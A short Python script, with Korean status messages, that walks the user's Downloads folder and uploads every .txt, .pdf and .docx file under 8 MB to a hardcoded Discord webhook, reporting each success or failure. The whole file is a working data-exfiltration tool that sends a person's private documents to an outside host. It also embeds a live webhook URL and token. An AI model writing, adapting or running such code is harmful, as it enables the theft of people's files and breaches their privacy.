import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1402614168791552144/J3G5RpNISCKC8_WYIjLd8-NxsWIpI6fDXCnWmFWtLDG6hfN-Mzx1aV1eDRgi1s020x3I"

folder = os.path.expanduser("~/Downloads")
exts = [".txt", ".pdf", ".docx"]
max_size = 8 * 1024 * 1024  

for root, _, files in os.walk(folder):
    for name in files:
        if not any(name.endswith(e) for e in exts):
            continue

        full_path = os.path.join(root, name)
        try:
            size = os.path.getsize(full_path)
            if size > max_size:
                print(f"[!] {name} - 파일 크기 초과 (건너뜀)")
                continue

            with open(full_path, "rb") as f:
                res = requests.post(WEBHOOK_URL, files={"file": (name, f)})

            if res.status_code == 200:
                print(f"[+] 전송 성공: {name}")
            else:
                print(f"[!] 전송 실패: {name} (응답코드 {res.status_code})")

        except Exception as err:
            print(f"[!] 에러 발생 - {name}: {err}")